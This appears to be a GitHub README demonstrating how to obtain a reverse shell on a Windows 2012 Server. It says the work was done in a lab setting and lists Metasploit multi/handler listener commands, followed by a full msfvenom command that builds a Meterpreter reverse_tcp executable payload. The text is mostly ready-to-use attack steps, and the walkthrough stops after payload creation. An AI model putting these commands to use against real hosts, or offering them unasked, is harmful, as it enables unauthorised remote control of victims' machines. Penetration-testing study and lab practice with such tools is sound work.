![image](https://user-images.githubusercontent.com/101802030/225642283-5574f2d4-dca9-4769-9fb3-b5c3181bd344.png)


# theperfectreverseshell
This is a demonstration of obtaining a reverse shell on a Windows 2012 Server. The aim of obtaining access is to view and copy the output produced by downloading certain tools to the compromised host and then run a script to compare the produced data against a pre-defined list of data

### The following steps are provided to obtain a reverse shell on a Windows 2012 Server. The steps performed, were carried out in a secure environment. Please ensure, if you do choose to replicate this activity that you either do so as qualified practitioner or that you have a qualified practitioner with you.

# Step 1 : Create a reverse handler using metasploit. To do so, you run the following commands -
  -1 - sudo msfconsole <br>
  -2 - use multi/handler <br>
  -3 - configure payload (preferable : windows/meterpreter/rerverse_tcp) <br>
  -4 - ensure that the "LHOST" and "LPORT" settings are correctly configured. You may do so, by running : set LHOST <IP Address of Host> and the set LPORT <port you would like to listen on> <br>
  -5 - once this has been completed, you may run : run -j or exploit -j at the msf prompt. This will create a persistent listener that will exit once you tell it to, it a disconnect from the client(victim). After doing so, you should see the following screen : <br>
  
  ![image](https://user-images.githubusercontent.com/101802030/225851486-2fa0062f-5b31-435c-8b7d-9b492d37a588.png)
  
  # Step 2 : Create an exploit using msfvenom. To do so, you run the following command -
  -1 - sudo msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=8888 -f exe -o ~/Downloads/my_new_exploit.exe
  - And you should see the following output :
  
  ![image](https://user-images.githubusercontent.com/101802030/225945823-7e83ae7e-f211-4359-8b63-a72db0f21506.png)



  
  


